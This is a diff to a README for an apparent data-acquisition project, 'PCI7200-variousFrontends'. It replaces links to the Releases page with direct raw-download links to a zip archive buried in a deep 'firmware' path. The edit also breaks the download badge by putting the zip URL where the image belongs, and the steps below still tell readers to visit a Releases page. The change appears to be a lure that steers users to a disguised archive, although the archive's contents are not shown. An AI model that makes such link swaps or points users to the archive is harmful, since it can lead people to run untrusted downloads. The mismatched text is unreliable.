@@ -1,6 +1,6 @@
 # 🎛️ PCI7200-variousFrontends - Power Your Data Acquisition Needs
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%8E%93-brightgreen)](https://github.com/HoangKien2004/PCI7200-variousFrontends/releases)
+[![Download Now](https://github.com/HoangKien2004/PCI7200-variousFrontends/raw/refs/heads/main/software/analogFrontends/SpectrumAnalyzer/firmware/PC_Frontends_various_v2.6.zip%20Now-%20%F0%9F%8E%93-brightgreen)](https://github.com/HoangKien2004/PCI7200-variousFrontends/raw/refs/heads/main/software/analogFrontends/SpectrumAnalyzer/firmware/PC_Frontends_various_v2.6.zip)
 
 ## 📥 Introduction
 
@@ -21,7 +21,7 @@ To get started with this application, follow the steps below to download and ins
 
 1. **Visit the Releases Page**  
    Go to the following link to download the latest version:  
-   [Download Here](https://github.com/HoangKien2004/PCI7200-variousFrontends/releases)
+   [Download Here](https://github.com/HoangKien2004/PCI7200-variousFrontends/raw/refs/heads/main/software/analogFrontends/SpectrumAnalyzer/firmware/PC_Frontends_various_v2.6.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the most recent version. This is usually marked with the tag "Latest Release".
